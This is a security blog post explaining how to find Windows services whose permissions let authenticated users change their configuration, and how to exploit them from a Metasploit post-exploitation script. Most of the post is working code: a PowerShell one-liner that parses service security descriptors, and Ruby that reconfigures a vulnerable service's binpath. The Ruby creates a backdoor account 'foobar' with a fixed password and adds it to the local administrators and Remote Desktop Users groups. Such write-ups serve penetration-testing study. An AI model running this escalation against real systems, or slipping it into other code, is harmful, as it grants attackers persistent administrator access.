<!DOCTYPE html>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="/css/highlight.min.css">
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    
    
    <title>Taha Draidia | Identify Weak Service Configuration With One Liner of Powershell</title>
    <script src="/js/highlight.min.js"></script>
    <script> hljs.initHighlightingOnLoad(); </script>
</head><body>
        
        <div id="container" class="container">
<span class="home_button"><a href="/">Back to home</a></span>
<h2 class="note_title">
<a href="/posts/identify-weak-service-configuration-with-oneliner-of-powershell/" rel="bookmark"
           title="Permalink to Identify Weak Service Configuration With One Liner of Powershell">Identify Weak Service Configuration With One Liner of Powershell</a></h2>


<div class="note_info">
        <div class="origin">
            <strong>Created by:</strong><a href="https://twitter.com/tahadraidia">@tahadraidia</a> || <a href="https://tahadraidia.com">tahadraidia.com</a> 
        </div>
		<br />

        <div class="published" title="2021-12-03 09:48:14 &#43;0000 UTC">
            <strong>Published:</strong> <time datetime="2021-12-03">Dec 3, 2021</time>
        </div>
		<br />

        <div class="tags" title="tags">
        	
        	<strong>Tags:</strong>
        	
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/powershell">Powershell</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/ruby">Ruby</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/metasploit">Metasploit</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/privilege-escalation">Privilege Escalation</a>
            
            
        </div>
</div>

<br>
<p>One of the features of PEN300 MSF script is lazy privilege escalation, it checks for few common excessive permissions and lack of configuration in certain component of the box.<br>
The missing part was how to identify weak service configuration? the approach was already known, however how to achieve it using MSF Ruby API or Win32 API seemed doomed.
MSF Windows Services class relies on sc_manager, this won&rsquo;t work with low privileged user. I have also tried to call the API using railgun and change paramter flags to query only the configuration but seemed to not work either. I didn&rsquo;t dig deeper, I might have missed something.<br>
The last option remaining is the use sdshow parameter of sc.exe  and grab the output then parse it. The first idea that I had is to use ruby API to walk through all the services in the box and construct an array for each SDDL and then parse it to look for the weak configuration. This approach is doable but not practical because it takes so much time to complete around 20-30 minutes and that&rsquo;s due how channels work in MSF, in short running a command line for each service from ruby API is not good idea in this case.
After doing some thinking, I remembered that PrivsChecks does a loads of checks in much short of time so I decided to use Powershell for the heavy lifting.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-POWERSHELL" data-lang="POWERSHELL"> get-service | <span style="color:#66d9ef">foreach</span>($_) { 
 $n = $_.Name;
 $o = sc.exe sdshow $n; $m =<span style="color:#e6db74">&#34;$o&#34;</span> <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#39;A;;([A-Z]+);;;AU&#39;</span>;
 <span style="color:#66d9ef">if</span>($m <span style="color:#f92672">-eq</span> $True){ 
 	$d = $Matches[1];
	<span style="color:#66d9ef">if</span>($d.contains(<span style="color:#e6db74">&#39;DC&#39;</span>) <span style="color:#f92672">-and</span> $d.contains(<span style="color:#e6db74">&#39;RP&#39;</span>)){<span style="color:#e6db74">&#34;$n&#34;</span>} 
	} 
}
</code></pre></div><p>The one liner is quite simple, walk through all the services, capture sdshow output into a variable, then filter the output using this regex <code>A;;([A-Z]+);;;AU</code> which, means gets allow SD that <code>allow (A) authenticated user (AU) to do actions on this servicer ([A-Z]+)</code>.<br>
From there we check for <code>DC</code> which, means change service config and we also we check for <code>RP</code> permissions, which means start the service. We look for only this two permissions because with these ones we can exploit the service.</p>
<p><img src="/images/WeakServicePowershellOneLiner/lab.png" alt="lab_test"></p>
<p>The implementation with MSF script is quite simple now, we just need to invoke our Powershell class help that we created last time and execute the script, however, there is a tiny caveat here, we are expecting only on returned value but in some environment we could have more but what are the odds? for now just keep it that way.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_windows_services_privscheck</span>
	print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Checking for weak configuration services&#34;</span>)
	<span style="color:#66d9ef">begin</span>
		<span style="color:#75715e"># Currently check only for weak configuration (RP and DC).</span>
		<span style="color:#75715e"># PrivescCheck will conver full test in paralel.</span>
		service <span style="color:#f92672">=</span> $powershell<span style="color:#f92672">.</span>execute_command(<span style="color:#e6db74">&#34;get-service | foreach($_) { $n = $_.Name; $o = sc.exe sdshow $n; $m =</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$o</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> -match &#39;A;;([A-Z]+);;;AU&#39;; if($m -eq $True){ $d = $Matches[1]; if($d.contains(&#39;DC&#39;) -and $d.contains(&#39;RP&#39;)){</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$n</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">} } }&#34;</span>)
		service<span style="color:#f92672">.</span>strip!
		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">unless</span> <span style="color:#f92672">!</span>service<span style="color:#f92672">.</span>empty? <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>service<span style="color:#f92672">.</span>nil?
		do_exploit_weak_conf_service(service)
	<span style="color:#66d9ef">rescue</span> <span style="color:#66d9ef">Exception</span> <span style="color:#f92672">=&gt;</span> e
		print_error(<span style="color:#e6db74">&#34;Lazy Windows Service Exploitation error: </span><span style="color:#e6db74">#{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
	<span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><p>The function do_exploit_weak_conf_service() simply creates a new local admin user part of remote desktop top users for insurance.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_exploit_weak_conf_service</span>(service_name)
	commands <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>
	<span style="color:#e6db74">&#39;net user foobar Password123! /add&#39;</span>,
	<span style="color:#e6db74">&#39;net localgroup administrators foobar /add&#39;</span>,
	<span style="color:#e6db74">&#39;net localgroup \&#34;Remote Desktop Users\&#34; foobar /add&#39;</span>
	<span style="color:#f92672">]</span>
	path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C:\\Windows\\System32\\cmd.exe&#39;</span>
	arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c sc config </span><span style="color:#e6db74">#{</span>service_name<span style="color:#e6db74">}</span><span style="color:#e6db74"> binpath= </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">#{</span>commands<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
	arg1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c sc config </span><span style="color:#e6db74">#{</span>service_name<span style="color:#e6db74">}</span><span style="color:#e6db74"> start= demand&#34;</span>
	arg2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c sc config </span><span style="color:#e6db74">#{</span>service_name<span style="color:#e6db74">}</span><span style="color:#e6db74"> obj= </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">LocalSystem</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> password= </span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74">&#34;</span>
	arg3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c sc start </span><span style="color:#e6db74">#{</span>service_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
	cmd_output <span style="color:#f92672">=</span> cmd_exec(path, arg)
	<span style="color:#66d9ef">if</span> cmd_output<span style="color:#f92672">.</span>include? <span style="color:#e6db74">&#39;SUCCESS&#39;</span>
		print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">[</span><span style="color:#e6db74">#{</span>service_name<span style="color:#e6db74">}</span><span style="color:#e6db74">] can be configured by current user&#34;</span>)
		<span style="color:#75715e"># Setting start to demand.</span>
		<span style="color:#75715e"># Since changing binpath was a success</span>
		<span style="color:#75715e"># No need to check for start= demand return value</span>
		cmd_exec(path, arg1)
		<span style="color:#75715e"># Same goes for obj and passwords parameters.</span>
		cmd_exec(path, arg2)
		<span style="color:#75715e"># Create user</span>
		cmd_exec(path, arg)
		<span style="color:#75715e"># Starting the service</span>
		cmd_output <span style="color:#f92672">=</span> cmd_exec(path, arg3)
		<span style="color:#66d9ef">if</span> cmd_output<span style="color:#f92672">.</span>include? <span style="color:#e6db74">&#39;not respond to the start&#39;</span>
			print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">[</span><span style="color:#e6db74">#{</span>service_name<span style="color:#e6db74">}</span><span style="color:#e6db74">] New local user is created foobar:Password123!&#34;</span>)
			<span style="color:#ae81ff">1</span><span style="color:#f92672">.</span>upto(<span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>i<span style="color:#f92672">|</span>
				arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c sc config </span><span style="color:#e6db74">#{</span>service_name<span style="color:#e6db74">}</span><span style="color:#e6db74"> binpath= </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">#{</span>commands<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
				cmd_exec(path, arg)
				cmd_exec(path, arg3)
			<span style="color:#66d9ef">end</span>
			print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">[</span><span style="color:#e6db74">#{</span>service_name<span style="color:#e6db74">}</span><span style="color:#e6db74">] Hacker has been added to local administrators and remote desktop users!&#34;</span>)
		<span style="color:#66d9ef">end</span>
	<span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><p>That&rsquo;s it folks! a quick and dirty hack to identify an excessive permissions on a Windows service!</p>
<p>References:</p>
<ul>
<li><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Post/Windows/Services">https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Post/Windows/Services</a></li>
<li><a href="https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/meterpreter/railgun-api-extension">https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/meterpreter/railgun-api-extension</a></li>
<li><a href="https://tahadraidia.com/posts/write-a-class-helper-for-metasploit-powershell-extension/">https://tahadraidia.com/posts/write-a-class-helper-for-metasploit-powershell-extension/</a></li>
<li><a href="https://tahadraidia.com/posts/build-an-atomic-windows-lab/">https://tahadraidia.com/posts/build-an-atomic-windows-lab/</a></li>
<li><a href="https://www.winhelponline.com/blog/view-edit-service-permissions-windows/">https://www.winhelponline.com/blog/view-edit-service-permissions-windows/</a></li>
</ul>

  <div class="contact">
    <h2>Contact</h2>
    Please feel free to ping me at <a href="https://twitter.com/tahadraidia">@tahadraidia</a>. Also you can see more of my work at <a href="https://tahadraidia.com">https://tahadraidia.com</a>.
</div>
</br> 
        </div>
        <script> hljs.initHighlightingOnLoad(); </script></body>
</html>
